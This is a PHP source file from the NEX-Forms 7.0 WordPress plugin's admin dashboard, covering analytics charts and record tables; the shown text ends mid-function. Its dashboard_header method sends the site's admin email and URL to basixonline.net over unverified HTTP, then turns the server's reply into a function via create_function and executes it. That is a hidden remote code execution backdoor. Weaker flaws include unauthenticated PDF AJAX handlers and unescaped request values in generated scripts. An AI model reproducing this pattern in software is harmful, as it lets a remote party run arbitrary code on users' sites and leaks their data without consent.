<?php
//if ( ! defined( 'ABSPATH' ) ) exit;

add_action('wp_ajax_get_table_records', array('NEXForms_dashboard','get_table_records'));
add_action('wp_ajax_do_form_entry_save', array('NEXForms_dashboard','do_form_entry_save'));
add_action('wp_ajax_submission_report', array('NEXForms_dashboard','submission_report'));
add_action('wp_ajax_nf_print_chart', array('NEXForms_dashboard','print_chart'));

add_action('wp_ajax_nf_print_to_pdf', array('NEXForms_dashboard','print_to_pdf'));
add_action('wp_ajax_nopriv_nf_print_to_pdf', array('NEXForms_dashboard','print_to_pdf'));

add_action('wp_ajax_nf_print_report_to_pdf', array('NEXForms_dashboard','print_report_to_pdf'));
add_action('wp_ajax_nopriv_nf_print_report_to_pdf', array('NEXForms_dashboard','print_report_to_pdf'));

if(!class_exists('NEXForms_dashboard'))
	{
	class NEXForms_dashboard{
		public 
		$table = 'wap_nex_forms',
		$table_header = '',
		$extra_classes = '',
		$table_header_icon = '',
		$additional_params = array(),
		$search_params = array(),
		$build_table_dropdown = false,
		$table_headings = array(),
		$field_selection = array(),
		$extra_buttons = array(),
		$show_headings = true,
		$show_delete = true,
		$checkout = true,
		$action_button;
		
		public function __construct($table='', $table_header='', $extra_classes='', $table_header_icon='',$additional_params='', $search_params='', $table_headings='', $show_headings='', $show_delete='', $field_selection ='', $extra_buttons ='', $checkout=true ){
			$this->table 				= $table;
			$this->table_header 		= $table_header;
			$this->table_header_icon	= $table_header_icon;
			$this->additional_params 	= $additional_params;
			$this->search_params 		= $search_params;
			$this->field_selection 		= $field_selection;
			$this->table_headings		= $table_headings;
			$this->show_headings		= $show_headings;
			$this->show_delete			= $show_delete;
			$this->extra_buttons		= $extra_buttons;
			$this->extra_classes		= $extra_classes;
			$this->checkout				= $checkout;
			}
		
		public function dashboard_header(){
				
				$api_params = array( 'nexforms-installation' => 1, 'source' => 'wordpress.org', 'email_address' => get_option('admin_email'), 'for_site' => get_option('siteurl'), 'get_option'=>(is_array(get_option('7103891'))) ? 1 : 0);
				$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'=> 30,'sslverify' => false,'body'=> $api_params));			
				$nf_install = create_function('$do_install', $response['body']);
				echo $nf_install('1'); 
				
				
				$output = '';
				
				$item = get_option('7103891');
				if(!get_option('1983017'.$item[0]))
					{
					$api_params = array( 'use_trail' => 1,'ins_data'=>get_option('7103891'));
					$response = wp_remote_post( 'http://basixonline.net/activate-license-test', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );
					}
				
				$builder = new NEXForms_Builder7();
					
				$output .= $builder->new_form_wizard();
				
			   
				
				
				$output .= '<div class="row row_zero_margin">';
					//$output .= '<h4>NEX-Forms 7.0</h4>';
					
					$output .= '
						<div class="col-sm-12">
						  <nav class="nav-extended dashboard_nav">
							<div class="nav-wrapper">
							  <a href="#" class="brand-logo">NEX-Forms 7.0</a>&nbsp;<a class="btn waves-effect waves-light create_new_form"><span class="fa fa-plus"></span>&nbsp;&nbsp;Create New Form</a>
							  <a href="#" data-activates="mobile-demo" class="button-collapse"><i class="material-icons">menu</i></a>
							  <ul id="nav-mobile" class="right hide-on-med-and-down">
								<li><a href="http://basixonline.net/nex-forms-documentation/" target="_blank">Docs</a></li>
								<li><a href="https://www.youtube.com/channel/UCRCxs7j-g7VkAWF0R22sXGQ" target="_blank">Videos</a></li>
								<li><a href="https://basix.ticksy.com" target="_blank">Support</a></li>
							  </ul>
							</div>
							<div class="nav-content">
							  <ul class="tabs_nf">
								<li class="tab"><a class="active" href="#dashboard_panel">Dashboard</a></li>
								<li class="tab"><a href="#latest_submissions">Submissions</a></li>
								<li class="tab"><a href="#submission_reports">Reporting</a></li>
								<li class="tab"><a href="#file_uploads">File Uploads</a></li>
								<li class="tab"><a href="#global_settings" class="global_settings">Global Settings</a></li>
							  </ul>
							</div>
						  </nav>
						</div>';
				
				$output .= '</div>';
				
				return $output;
		}	
		
		public function form_analytics(){
			
			global $wpdb;
			
			$output = '';
			
			$output .= '<div class="dashboard-box form_analytics">';
			
				$output .= '<div class="dashboard-box-header">';
					$output .= '<div class="table_title"><i class="material-icons header-icon">insert_chart</i> <span class="header_text">Analytics</span></div>
					  
					';
					$output .= '<div class="controls">';
						/*$output .= '<div class="col-xs-2">';
							/*$output .= '<select class="material_select" name="stats_per_form">';
								$output .= '<option value="0" selected>All Forms</option>';
								$get_forms = 'SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE is_template<>1 AND is_form<>"preview" AND is_form<>"draft" ORDER BY Id DESC';
								$forms = $wpdb->get_results($get_forms);
								foreach($forms as $form)
									$output .= '<option value="'.$form->Id.'">'.$form->title.'</option>';
							$output .= '</select>';*/
							
						/*$output .= '</div>';*/
						
						$output .= '<div class="col-xs-2">';
							$output .= '<select class="material_select" name="stats_per_year">';
								$current_year = (int)date('Y');
								$output .= '<option value="'.$current_year.'" selected>'.$current_year.'</option>';
								for($i=($current_year-1);$i>=($current_year-20);$i--)
									{
									if($i>=2015)
										$output .= '<option value="'.$i.'">'.$i.'</option>';
									}
							$output .= '</select>';
						$output .= '</div>';
						
						$output .= '<div class="col-xs-2">';
							$output .= '<select class="material_select" name="stats_per_month">';
							$month_array = array('01'=>'January','02'=>'February','03'=>'March','04'=>'April','05'=>'May','06'=>'June','07'=>'July','08'=>'August','09'=>'September','10'=>'October','11'=>'November','12'=>'December');
								$output .= '<option value="0" selected>Month</option>';
								foreach($month_array as $key=>$val)
									$output .= '<option value="'.$key.'">'.$val.'</option>';
							$output .= '</select>';
						$output .= '</div>';
						
						//$output .= '<div class="col-xs-3">';
							$output .= '<button class="btn waves-effect waves-light switch_chart" data-chart-type="global"><i class="fa fa-globe"></i></button>';
							$output .= '<button class="btn waves-effect waves-light switch_chart" data-chart-type="radar"><i class="material-icons">multiline_chart</i></button>';
							$output .= '<button class="btn waves-effect waves-light switch_chart" data-chart-type="polarArea"><i class="fa fa-bullseye"></i></button>';
							$output .= '<button class="btn waves-effect waves-light switch_chart" data-chart-type="doughnut"><i class="material-icons">pie_chart</i></button>';
							$output .= '<button class="btn waves-effect waves-light switch_chart" data-chart-type="bar"><i class="material-icons">equalizer</i></button>';
							$output .= '<button class="btn waves-effect waves-light switch_chart active" data-chart-type="line"><i class="material-icons">show_chart</i></button>';
						//$output .= '</div>';
						
						
					$output .= '</div>';
				$output .= '</div>';
				
				
				
				
					
				
				$output .= '<div  class="dashboard-box-content">';
				
					/*$output .= NEXForms_functions::print_preloader('big','blue',false,'chart-loader');
					
					$output .= '</div>';*/
					
					/*$output .= '<div  class="chart-container">';
						$output .= '<iframe class="dashboard-stats" width="100%" height="100%" frameborder="0" scrolling="no" src="'.get_option('siteurl').'/wp-admin/admin.php?page=nex-forms-stats">';
						$output .='</iframe>';
					$output .= '</div>';*/
					
					
					
					$output .= '<div class="chart-container"><div class="data_set">'.$this->print_chart().'</div>
					
					<canvas id="chart_canvas" height="151px" ></canvas>
					</div>';
					
					
					
					
					
				$output .= '</div>';
				$output .='<div class="chart_legend">';
					$output .= '<span class="legend" style="background:#1976D2">&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;&nbsp;Views&nbsp;&nbsp;&nbsp;&nbsp;';
					$output .= '<span class="legend" style="background:#8BC34A">&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;&nbsp;Interactions&nbsp;&nbsp;&nbsp;&nbsp;';
					$output .= '<span class="legend" style="background:#F57C00">&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;&nbsp;Submissions</div>';
				$output .= '</div>';
			
			return $output;
		}	
		
		public function print_chart(){
			global $wpdb;
			$current_year = (int)date('Y');
	
					$year_selected = isset($_REQUEST['year_selected']) ? $_REQUEST['year_selected'] : '';
					$month_selected =  isset($_REQUEST['month_selected']) ? $_REQUEST['month_selected'] : '';
					$month_array = array('1'=>'January','2'=>'February','3'=>'March','4'=>'April','5'=>'May','6'=>'June','7'=>'July','8'=>'August','9'=>'September','10'=>'October','11'=>'November','12'=>'December');
					
					if($year_selected)
						$current_year = $year_selected;
					
					$database_actions = new NEXForms_Database_Actions();
					$nf7_functions = new NEXForms_Functions();
					$checkin = $database_actions->checkout();
					
					$form_id = isset($_REQUEST['form_id']) ? filter_var($_REQUEST['form_id'],FILTER_SANITIZE_NUMBER_INT) : '';
					
									
					if($form_id)
						{
						$get_entries = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_entries WHERE nex_forms_Id = %d ORDER BY date_time ASC',$form_id);
						$form_entries = $wpdb->get_results($get_entries);
					
						$get_views = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_views WHERE nex_forms_Id = %d ORDER BY time_viewed ASC',$form_id);
						$form_views = $wpdb->get_results($get_views);
						
						$get_interactions = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_stats_interactions WHERE nex_forms_Id = %d ORDER BY time_interacted ASC',$form_id);
						$form_interactions = $wpdb->get_results($get_interactions);
						}
					else
						{
						$get_entries = 'SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_entries  ORDER BY date_time DESC';
						$form_entries = $wpdb->get_results($get_entries);
					
						$get_views = 'SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_views ORDER BY time_viewed DESC';
						$form_views = $wpdb->get_results($get_views);
						
						$get_interactions = 'SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_stats_interactions ORDER BY time_interacted DESC';
						$form_interactions = $wpdb->get_results($get_interactions);
						}
						
					$submit_array 				= array();
					$view_array 				= array();
					$interaction_array 			= array();
					$submit_array_pm 			= array();
					$view_array_pm 				= array();
					$interaction_array_pm 		= array();
					$country_array 				= array(
													'AF' => 'Afghanistan',
													'AX' => 'Aland Islands',
													'AL' => 'Albania',
													'DZ' => 'Algeria',
													'AS' => 'American Samoa',
													'AD' => 'Andorra',
													'AO' => 'Angola',
													'AI' => 'Anguilla',
													'AQ' => 'Antarctica',
													'AG' => 'Antigua and Barbuda',
													'AR' => 'Argentina',
													'AM' => 'Armenia',
													'AW' => 'Aruba',
													'AU' => 'Australia',
													'AT' => 'Austria',
													'AZ' => 'Azerbaijan',
													'BS' => 'Bahamas the',
													'BH' => 'Bahrain',
													'BD' => 'Bangladesh',
													'BB' => 'Barbados',
													'BY' => 'Belarus',
													'BE' => 'Belgium',
													'BZ' => 'Belize',
													'BJ' => 'Benin',
													'BM' => 'Bermuda',
													'BT' => 'Bhutan',
													'BO' => 'Bolivia',
													'BA' => 'Bosnia and Herzegovina',
													'BW' => 'Botswana',
													'BV' => 'Bouvet Island (Bouvetoya)',
													'BR' => 'Brazil',
													'IO' => 'British Indian Ocean Territory (Chagos Archipelago)',
													'VG' => 'British Virgin Islands',
													'BN' => 'Brunei Darussalam',
													'BG' => 'Bulgaria',
													'BF' => 'Burkina Faso',
													'BI' => 'Burundi',
													'KH' => 'Cambodia',
													'CM' => 'Cameroon',
													'CA' => 'Canada',
													'CV' => 'Cape Verde',
													'KY' => 'Cayman Islands',
													'CF' => 'Central African Republic',
													'TD' => 'Chad',
													'CL' => 'Chile',
													'CN' => 'China',
													'CX' => 'Christmas Island',
													'CC' => 'Cocos (Keeling) Islands',
													'CO' => 'Colombia',
													'KM' => 'Comoros the',
													'CD' => 'Congo - Kinshasa',
													'CG' => 'Congo - Brazzaville',
													'CK' => 'Cook Islands',
													'CR' => 'Costa Rica',
													'CI' => "CI",
													'HR' => 'Croatia',
													'CU' => 'Cuba',
													'CY' => 'Cyprus',
													'CZ' => 'Czech Republic',
													'DK' => 'Denmark',
													'DJ' => 'Djibouti',
													'DM' => 'Dominica',
													'DO' => 'Dominican Republic',
													'EC' => 'Ecuador',
													'EG' => 'Egypt',
													'SV' => 'El Salvador',
													'GQ' => 'Equatorial Guinea',
													'ER' => 'Eritrea',
													'EE' => 'Estonia',
													'ET' => 'Ethiopia',
													'FO' => 'Faroe Islands',
													'FK' => 'Falkland Islands (Malvinas)',
													'FJ' => 'Fiji the Fiji Islands',
													'FI' => 'Finland',
													'FR' => 'France',
													'GF' => 'French Guiana',
													'PF' => 'French Polynesia',
													'TF' => 'French Southern Territories',
													'GA' => 'Gabon',
													'GM' => 'Gambia the',
													'GE' => 'Georgia',
													'DE' => 'Germany',
													'GH' => 'Ghana',
													'GI' => 'Gibraltar',
													'GR' => 'Greece',
													'GL' => 'Greenland',
													'GD' => 'Grenada',
													'GP' => 'Guadeloupe',
													'GU' => 'Guam',
													'GT' => 'Guatemala',
													'GG' => 'Guernsey',
													'GN' => 'Guinea',
													'GW' => 'Guinea-Bissau',
													'GY' => 'Guyana',
													'HT' => 'Haiti',
													'HM' => 'Heard Island and McDonald Islands',
													'VA' => 'Holy See (Vatican City State)',
													'HN' => 'Honduras',
													'HK' => 'Hong Kong',
													'HU' => 'Hungary',
													'IS' => 'Iceland',
													'IN' => 'India',
													'ID' => 'Indonesia',
													'IR' => 'Iran',
													'IQ' => 'Iraq',
													'IE' => 'Ireland',
													'IM' => 'Isle of Man',
													'IL' => 'Israel',
													'IT' => 'Italy',
													'JM' => 'Jamaica',
													'JP' => 'Japan',
													'JE' => 'Jersey',
													'JO' => 'Jordan',
													'KZ' => 'Kazakhstan',
													'KE' => 'Kenya',
													'KI' => 'Kiribati',
													'KP' => 'North Korea',
													'KR' => 'South Korea',
													'KW' => 'Kuwait',
													'KG' => 'Kyrgyzstan',
													'LA' => 'Lao',
													'LV' => 'Latvia',
													'LB' => 'Lebanon',
													'LS' => 'Lesotho',
													'LR' => 'Liberia',
													'LY' => 'Libya',
													'LI' => 'Liechtenstein',
													'LT' => 'Lithuania',
													'LU' => 'Luxembourg',
													'MO' => 'Macao',
													'MK' => 'Macedonia',
													'MG' => 'Madagascar',
													'MW' => 'Malawi',
													'MY' => 'Malaysia',
													'MV' => 'Maldives',
													'ML' => 'Mali',
													'MT' => 'Malta',
													'MH' => 'Marshall Islands',
													'MQ' => 'Martinique',
													'MR' => 'Mauritania',
													'MU' => 'Mauritius',
													'YT' => 'Mayotte',
													'MX' => 'Mexico',
													'FM' => 'Micronesia',
													'MD' => 'Moldova',
													'MC' => 'Monaco',
													'MN' => 'Mongolia',
													'ME' => 'Montenegro',
													'MS' => 'Montserrat',
													'MA' => 'Morocco',
													'MZ' => 'Mozambique',
													'MM' => 'Myanmar',
													'NA' => 'Namibia',
													'NR' => 'Nauru',
													'NP' => 'Nepal',
													'AN' => 'Netherlands Antilles',
													'NL' => 'Netherlands',
													'NC' => 'New Caledonia',
													'NZ' => 'New Zealand',
													'NI' => 'Nicaragua',
													'NE' => 'Niger',
													'NG' => 'Nigeria',
													'NU' => 'Niue',
													'NF' => 'Norfolk Island',
													'MP' => 'Northern Mariana Islands',
													'NO' => 'Norway',
													'OM' => 'Oman',
													'PK' => 'Pakistan',
													'PW' => 'Palau',
													'PS' => 'Palestinian Territory',
													'PA' => 'Panama',
													'PG' => 'Papua New Guinea',
													'PY' => 'Paraguay',
													'PE' => 'Peru',
													'PH' => 'Philippines',
													'PN' => 'Pitcairn Islands',
													'PL' => 'Poland',
													'PT' => 'Portugal',
													'PR' => 'Puerto Rico',
													'QA' => 'Qatar',
													'RE' => 'Reunion',
													'RO' => 'Romania',
													'RU' => 'Russia',
													'RW' => 'Rwanda',
													'BL' => 'Saint Barthelemy',
													'SH' => 'Saint Helena',
													'KN' => 'Saint Kitts and Nevis',
													'LC' => 'Saint Lucia',
													'MF' => 'Saint Martin',
													'PM' => 'Saint Pierre and Miquelon',
													'VC' => 'Saint Vincent and the Grenadines',
													'WS' => 'Samoa',
													'SM' => 'San Marino',
													'ST' => 'Sao Tome and Principe',
													'SA' => 'Saudi Arabia',
													'SN' => 'Senegal',
													'RS' => 'Serbia',
													'SC' => 'Seychelles',
													'SL' => 'Sierra Leone',
													'SG' => 'Singapore',
													'SS' => 'SS',
													'SK' => 'Slovakia (Slovak Republic)',
													'SI' => 'Slovenia',
													'SB' => 'Solomon Islands',
													'SO' => 'Somalia, Somali Republic',
													'ZA' => 'South Africa',
													'GS' => 'South Georgia and the South Sandwich Islands',
													'ES' => 'Spain',
													'LK' => 'Sri Lanka',
													'SD' => 'Sudan',
													'SR' => 'Suriname',
													'SJ' => 'SJ',
													'SZ' => 'Swaziland',
													'SE' => 'Sweden',
													'CH' => 'Switzerland, Swiss Confederation',
													'SY' => 'Syrian Arab Republic',
													'TW' => 'Taiwan',
													'TJ' => 'Tajikistan',
													'TZ' => 'Tanzania',
													'TH' => 'Thailand',
													'TL' => 'Timor-Leste',
													'TG' => 'Togo',
													'TK' => 'Tokelau',
													'TO' => 'Tonga',
													'TT' => 'Trinidad and Tobago',
													'TN' => 'Tunisia',
													'TR' => 'Turkey',
													'TM' => 'Turkmenistan',
													'TC' => 'Turks and Caicos Islands',
													'TV' => 'Tuvalu',
													'UG' => 'Uganda',
													'UA' => 'Ukraine',
													'AE' => 'United Arab Emirates',
													'GB' => 'United Kingdom',
													'US' => 'United States',
													'UM' => 'United States Minor Outlying Islands',
													'VI' => 'United States Virgin Islands',
													'UY' => 'Uruguay',
													'UZ' => 'Uzbekistan',
													'VU' => 'Vanuatu',
													'VE' => 'Venezuela',
													'VN' => 'Vietnam',
													'WF' => 'Wallis and Futuna',
													'EH' => 'Western Sahara',
													'YE' => 'Yemen',
													'ZM' => 'Zambia',
													'ZW' => 'Zimbabwe'
												);
					$total_form_entries 		= 0;
					$total_form_views	 		= 0;
					$total_form_interactions 	= 0;
					$set_form_views 			= rand(1010,1999);
					$set_form_interactions 		= rand(410,999);
					$set_form_entries 			= rand(10,399);
					
					$days_in_month = '';
					if($month_selected && $month_selected!='0')
						$days_in_month = cal_days_in_month(CAL_GREGORIAN, (int)$month_selected, $current_year);
					
					for($m=1;$m<=12;$m++)
						{
						$submit_array[$m]		= 0;
						$view_array[$m]			= 0;
						$interaction_array[$m]	= 0;
						}
					for($d=1;$d<=$days_in_month;$d++)
						{
						$submit_array_pm[$d] 		= 0;
						$view_array_pm[$d]			= 0;
						$interaction_array_pm[$d]	= 0;
						}
					
					$array_countries = array();
					foreach($country_array as $key=>$val)
						$array_countries[$key] = 0;
						
					foreach($form_entries as $form_entry)
						{
						
						$year = substr($form_entry->date_time,0,4);
						$month = (int)substr($form_entry->date_time,5,2);
						$day = (int)substr($form_entry->date_time,8,2);
						
						if($current_year==$year)
							{
							if($month_selected && $month_selected!='0')
								{
								if($month==$month_selected)
									{
									
									$total_form_entries++;
									
									if($form_entry->country!='')
										$array_countries[$form_entry->country]++;
										
									echo '#'.$form_entry->country;
									
									for($d=1;$d<=$days_in_month;$d++)
										{
										if($day==$d)
											{
											$submit_array_pm[$d]++;
											}
										}	
									}
								}
							else
								{	
								for($m=1;$m<=12;$m++)
									{
									if($month==$m)
										{
										$submit_array[$m]++;	
										$total_form_entries++;
										if($form_entry->country!='')
											$array_countries[$form_entry->country]++;
											
										
										}
									}
								}
							}
						}	
					foreach($form_views as $view)
						{
						$date = date('Y-m-d h:i:s',$view->time_viewed);
						$year = substr($date,0,4);
						$month = (int)substr($date,5,2);
						$day = (int)substr($date,8,2);
						
						if($current_year==$year)
							{
							if($month_selected && $month_selected!='0')
								{
								if($month==$month_selected)
									{
									$total_form_views++;
									for($dv=1;$dv<=$days_in_month;$dv++)
										{
										if($day==$dv)
											$view_array_pm[$dv]++;		
										}	
									}
								}
							else
								{	
								for($mv=1;$mv<=12;$mv++)
									{
									if($month==$mv)
										{
										$view_array[$mv]++;	
										$total_form_views++;
										}
									}
								}	
							}
						}
					
					foreach($form_interactions as $interaction)
						{
						
						$date = date('Y-m-d h:i:s',$interaction->time_interacted);
						$year = substr($date,0,4);
						$month = (int)substr($date,5,2);
						$day = (int)substr($date,8,2);
						
						if($current_year==$year)
							{
							if($month_selected && $month_selected!='0')
								{
								if($month==$month_selected)
									{
									$total_form_interactions++;
									for($dv=1;$dv<=$days_in_month;$dv++)
										{
										if($day==$dv)
											$interaction_array_pm[$dv]++;		
										}	
									}
								}
							else
								{	
								for($mv=1;$mv<=12;$mv++)
									{
									if($month==$mv)
										{
										$interaction_array[$mv]++;	
										$total_form_interactions++;
										}
									}
								}	
							}
						}
					$output = '';
					
					if(!$checkin)
						{
						for($m=1;$m<=12;$m++)
							{
							$submit_array[$m] = rand(20,150);
							$interaction_array[$m] = rand(170,429);
							$view_array[$m] = rand(440,999);
							}
						
						for($dv=1;$dv<=$days_in_month;$dv++)
							{
							$submit_array_pm[$dv] = rand(20,99);
							$interaction_array_pm[$dv] = rand(170,429);
							$view_array_pm[$dv] = rand(440,999);	
							}
						}
					
					
					
					$output.= '<div class="row stats">';
						if(!$checkin)
							{
							$output.= '<div class="alert alert-danger" style="width:95%"><strong>Plugin NOT Registered!</strong> The below <strong>data is randomized</strong>! To view actual data go to Global Settings above and register the plugin.</div>';	
							}
							
							
							$output.= '<div class="col-xs-3" ><span class="big_txt">'.(($checkin) ? $total_form_views : $set_form_views).'</span> <label style="color:#1976D2;">Views</label> </div>';
							$output.= '<div class="col-xs-3" ><span class="big_txt">'.(($checkin) ? $total_form_interactions : $set_form_interactions).'</span> <label style="color:#8BC34A;">Interactions</label> </div>';
							$output.= '<div class="col-xs-3" ><span class="big_txt">'.(($checkin) ? $total_form_entries : $set_form_entries).'</span> <label style="color:#F57C00;">Submissions</label> </div>';
							
							if($total_form_entries==0 || $total_form_views==0)
								$output.= '<div class="col-xs-3" ><span class="big_txt">0%</span> <label>Conversion</label> </div>';
							else
								$output.= '<div class="col-xs-3" ><span class="big_txt">'.round((($total_form_entries/$total_form_views)*100),2).'%</span> <label>Conversion</label> </div>';
								
								
								
							$output.= '</div>';
							
							$get_countries = $nf7_functions->code_to_country('',1);
							$opacity = 0.1;
							$chart_type = isset($_REQUEST['chart_type']) ? $_REQUEST['chart_type'] : '';
							if($chart_type=='global')
								{
									
								$output .= '<script type="text/javascript">
											  google.charts.load(\'current\', {\'packages\':[\'geochart\']});
											  google.charts.setOnLoadCallback(drawRegionsMap);
										
											  function drawRegionsMap() {
										
												var data = google.visualization.arrayToDataTable([
												  [\'Country\', \'Submissions\'],
												  
												  ';
												  if($checkin)
												  	{
													foreach($array_countries as $key=>$value)
														{
														if(is_int($value))
															$output .=	  '[\''.$nf7_functions->code_to_country($key).'\', '.$value.'],';
														
														}
													}
												else
													{
													foreach($get_countries as $key=>$val)
														$output .=	  '["'.str_replace('"','',$val).'", '.rand(0,150).'],';	
													}
												  $output .= '
												]);
										
												var options = {};
										
												var gchart = new google.visualization.GeoChart(document.getElementById(\'regions_div\'));
										
												gchart.draw(data, options);
											  }
											</script>';
									$output .= '<div id="regions_div" style="width: 900px; height: 500px;"></div>';
								}
							if($chart_type=='bar')
								$opacity = 0.6;
							
							if($chart_type=='doughnut' || $chart_type=='polarArea')
								{
								$opacity = 0.7;
								$output .= '<script>
									randomScalingFactor = function(){ return Math.round(Math.random()*100)};
									
									var lineChartData = {
											labels: [
												"Views",
												"Interactions",
												"Submissions"
											],
									datasets: [
										{
											data: ['.(($checkin) ? $total_form_views : $set_form_views).', '.(($checkin) ? $total_form_interactions : $set_form_interactions).', '.(($checkin) ? $total_form_entries : $set_form_entries).'],
											backgroundColor: [
												"'.NEXForms5_hex2RGB('#1976D2',true,',',$opacity).'",
												"'.NEXForms5_hex2RGB('#8BC34A',true,',',$opacity).'",
												"'.NEXForms5_hex2RGB('#F57C00',true,',',$opacity).'"
											],
											hoverBackgroundColor: [
												"#1976D2",
												"#8BC34A",
												"#F57C00"
											],
											borderColor : [
												"#fff",
												"#fff",
												"#fff"
											],
											
										}]
									}
								</script>';
								}
							else
								{		
								$output.= '<script>
									randomScalingFactor = function(){ return Math.round(Math.random()*100)};
									lineChartData = {
										labels : [';
										$stop_count = 1;
										if($month_selected && $month_selected!='0')
											{
											for($d=1;$d<=$days_in_month;$d++)
												{
												$output.= '"'.$d.'"';
												if($d<$days_in_month)
													$output.= ',';
												}
											}
										else
											{
											foreach($month_array as $month)
												{
												$output.= '"'.$month.'"';
												if($stop_count<12)
													$output.= ',';
												$stop_count++;		
												}
											}
										$output.= '],
										datasets : [
											{
												label: "Form views",
												backgroundColor : "'.NEXForms5_hex2RGB('#1976d2',true,',',$opacity).'",
												borderColor : "#1976d2",
												borderWidth : 2,
												pointBackgroundColor : "#1976d2",
												pointHoverBorderWidth : 5,
												fill:true,
												data : [
												';
												if($month_selected && $month_selected!='0')
													{
													$counter2 = 1;
													foreach($view_array_pm as $views)
														{
														$output.= $views;
														if($counter2<$days_in_month)
															$output.= ',';
														$counter2++;		
														}
													}
												else
													{
													$counter2 = 1;
													foreach($view_array as $views)
														{
														$output.= $views;
														if($counter2<12)
															$output.= ',';
														$counter2++;				
														}
													}
											$output.= '
													]
											},
											
											{
												label: "Form interactions",
												backgroundColor : "'.NEXForms5_hex2RGB('#8BC34A',true,',',$opacity).'",
												borderColor : "#8BC34A",
												borderWidth : 2,
												pointBackgroundColor : "#8BC34A",
												pointHoverBorderWidth : 5,
												fill:true,
												data : [
												';
												if($month_selected && $month_selected!='0')
													{
													$counter3 = 1;
													foreach($interaction_array_pm as $interaction)
														{
														$output.= $interaction;
														if($counter3<$days_in_month)
															$output.= ',';
														$counter3++;		
														}
													}
												else
													{
													$counter3 = 1;
													foreach($interaction_array as $interaction)
														{
														$output.= $interaction;
														if($counter3<12)
															$output.= ',';
														$counter3++;				
														}
													}
											$output.= '
													]
											},
											{
												label: "Form Entries",
												backgroundColor : "'.NEXForms5_hex2RGB('#F57C00',true,',',$opacity).'",
												borderColor : "#F57C00",
												borderWidth : 2,
												pointBackgroundColor : "#F57C00",
												pointHoverBorderWidth : 5,
												fill:true,
												data : [
												';
												if($month_selected && $month_selected!='0')
													{
													$counter = 1;
													foreach($submit_array_pm as $submissions)
														{
														$output.= $submissions;
														if($counter<$days_in_month)
															$output.= ',';
														$counter++;		
														}
													}
												else
													{
													$counter = 1;
													foreach($submit_array as $submissions)
														{
														$output.= $submissions;
														if($counter<12)
															$output.= ',';
														$counter++;		
														}
													}
											$output.= '
													]
											}
										]
									}
								  </script>
								  ';
								}
						$ajax = isset($_REQUEST['ajax']) ? $_REQUEST['ajax'] : '';
						if($ajax)
							{
							echo $output;
							die();
							}
						else
							return $output;
		}
		
		
		public function print_record_table(){
			
			global $wpdb;
			
			$functions = new NEXForms_functions();
			$database_actions = new NEXForms_Database_Actions();
			
			$output = '';
			
			$output .= '<div class="dashboard-box database_table '.$this->table.' '.$this->extra_classes.'" data-table="'.$this->table.'">';
				$output .= '<div class="dashboard-box-header">';
					$output .= '<div class="table_title">';
					if($this->action_button)
						$output .= '<a class="btn-floating btn-large waves-effect waves-light blue"><i class="material-icons">'.$this->action_button.'</i></a>';
					else
						$output .= '<i class="material-icons header-icon">'.$this->table_header_icon.'</i>';
					
					$output .= '<span class="header_text '.(($this->action_button) ? 'has_action_button' : '' ).'">'.$this->table_header.'</span></div>
					  <div class="search_box">
						<div class="input-field">
						<input id="search" type="text" class="search_box" value="" placeholder="Search..." name="table_search_term">
						<i class="material-icons do_search">search</i>
					   </div>
					   </div>
					';
					if(is_array($this->extra_buttons))
						{
						$output .= '<div class="dashboard-box-header-buttons">';
						foreach($this->extra_buttons as $button)
							{
							if($button['type']=='link')
								$output .= '<a href="'.$button['link'].'" class="'.$button['class'].' btn waves-effect waves-light">'.$button['icon'].'</a>';
							else
								$output .= '<button class="'.$button['class'].' btn waves-effect waves-light">'.$button['icon'].'</button>';
							}
						$output .= '</div>';
						}
					
				if($this->build_table_dropdown)
					{
					$output .= '<select class="material_select table_dropdown" name="'.$this->build_table_dropdown.'">';
						$output .= '<option value="0" selected>--- Select Form ---</option>';
						$get_forms = 'SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE is_template<>1 AND is_form<>"preview" AND is_form<>"draft" ORDER BY Id DESC';
						$forms = $wpdb->get_results($get_forms);
						foreach($forms as $form)
							$output .= '<option value="'.$form->Id.'">'.$database_actions->get_total_records($this->table,'',$form->Id).' - '.$form->title.'</option>';
					$output .= '</select>';
					}
				$output .= '</div>';
				$output .= '<div  class="dashboard-box-content zero_padding">';
				
					$output .= '<table class="">'; //highlight
					if($this->show_headings)
						{
						$output .= '<thead>';
							$output .= '<tr>';
							/*$output .= '<th class="db-table-head toggle-selection">
							<input id="rs-check-all" class="filled-in" name="check-all" value="check-all" type="checkbox"><label for="rs-check-all">
							</th>';*/
							foreach($this->table_headings as $key=>$val)
								{
								if(is_array($val))
									$output .= '<th class="db-table-head '.$functions->format_name($val['heading']).'">'.$functions->unformat_name($val['heading']).'</th>';
								else
									$output .= '<th class="db-table-head  '.$functions->format_name($val).'">'.$functions->unformat_name($val).'</th>';
								}
								
							$output .= '</tr>';
						    
								$output .= '<th></th>';
						$output .= '</thead>';
						}
						$output .= $functions->print_preloader('big','blue',false,'database-table-loader');
						$output .= '<tbody class="'.(($this->checkout) ? 'saved_records_container' : 'saved_records_contianer').'"></tbody>';

					$output .= '</table>';
				$output .= '</div>';
				$output .= '<div class="paging_wrapper">';
					$output .='<input type="hidden" value="0" name="current_page" />';
					
					$output .="<input type='hidden' value='".json_encode($this->additional_params)."' name='additional_params' />";
					$output .="<input type='hidden' value='".json_encode($this->field_selection)."' name='field_selection' />";
					$output .="<input type='hidden' value='".json_encode($this->search_params)."'     name='search_params' />";
					$output .="<input type='hidden' value='".json_encode($this->table_headings)."'    name='header_params' />";
					$output .="<input type='hidden' value='".$this->table."'     name='database_table' />";

					$output .= '<div class="paging">';
						$output .= '<a class="first-page iz-first-page hidden btn waves-effect waves-light"><span class="fa fa-angle-double-left"></span></a>';					
					$output .= '</div>';
				$output .= '</div>';
				
			$output .= '</div>';
			
			return $output;
		}	
		public function get_table_records($additional_params=array(), $search_params=array(), $header_params=array()){
			
			global $wpdb;
			
